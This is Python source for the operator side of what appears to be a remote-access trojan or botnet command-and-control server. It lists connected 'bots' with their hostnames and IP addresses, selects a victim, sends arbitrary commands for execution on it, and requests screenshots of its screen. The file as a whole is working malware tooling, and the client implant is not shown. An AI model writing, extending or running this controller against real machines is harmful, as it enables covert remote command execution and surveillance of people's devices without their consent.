from core.sock import NetterServer
from core.bucket import ConnectionBucket
from threading import Thread
from sys import exit as _exit
from loguru import logger
from json import loads

from time import sleep as time_sleep

config: dict = loads(open('config.json', 'r').read())['server']
bucket: ConnectionBucket = ConnectionBucket()

try:
    NetServer: NetterServer = NetterServer(
        connectionBucket = bucket,
        _bind_address = (
            config['bind_address'],
            config['bind_port']
        )
    )

except OSError:
    logger.error('Bind Address is already in use')
    _exit(1)

# ====================================================================================================== #

@bucket.command(['bot', 'bots'])
def check_client() -> None:
    if not bucket.connectionList:
        logger.info('No client is connected at the moment...')
        return

    logger.info('List of connected client currently:')

    for clientDevice in bucket.connectionList:
        print(f'  L {clientDevice.hostname} : {clientDevice.clientUniqueID}')

    print()

@bucket.command(['info', 'whois'], accept_args = True)
def client_info(*clientID) -> None:
    selectedClient = NetServer._selectedClient if NetServer._selectedClient is not None else bucket.get_client_by_id(clientID)

    if (selectedClient is None):
        logger.error('Client ID not found'); return

    if not clientID:
        logger.error('Missing argumment: Client Unique ID')
        return

    logger.info(f'{selectedClient.hostname}\'s device information:'); \
        print(' L Hostname : %s' % selectedClient.hostname); \
        print(' L Public IP Address : %s' % selectedClient.publib_address); \
        print(' L Local IP Address : %s\n' % selectedClient.local_address)

    logger.info('Additional information:')

    for key, value in selectedClient.additionalData.items():
        print(' L %s : %s' % (key, value))

    print('')

@bucket.command(['select'], accept_args = True)
def select_client(*args) -> None:
    if not args:
        logger.error('Missing argumment: Client Unique ID')
        return

    if not (selectedCli := bucket.get_client_by_id(args)):
        logger.error('Client ID not found'); return

    NetServer._selectedClient = selectedCli

@bucket.command(['run'], accept_args = True)
def exec_command(*args) -> None:
    if not NetServer._selectedClient:
        logger.error('A client has to be selected in order to use this command')
        return

    NetServer._selectedClient.socket.send_packet('execute_command ' + ' '.join(args))
    NetServer._waitingForResponse = True

    while (NetServer._waitingForResponse):
        time_sleep(1)

@bucket.command(['screenshot', 'ss'], accept_args = True)
def screenshot(*clientID) -> None:
    if (NetServer._selectedClient):
        NetServer._selectedClient.socket.send_packet('request_screenshot')
        logger.info('Waiting for client\'s response')
        NetServer._waitingForResponse = True

        while NetServer._waitingForResponse: time_sleep(1)
        return

    if not clientID:
        logger.error('Missing argument: Client Unique ID')
        return

    if not (selectedCli := bucket.get_client_by_id(clientID)):
        logger.error('Client ID not found'); return

    selectedCli.socket.send_packet('request_screenshot')
    logger.info('Waiting for client\'s response')
    NetServer._waitingForResponse = True

    while NetServer._waitingForResponse: time_sleep(1)

# ====================================================================================================== #

Thread(target = NetServer.controller).start()

while NetServer.isRunning:
    if client := NetServer.accept():
        logger.info(f'{client.publib_address} ({client.hostname}) just hopped onto the server')
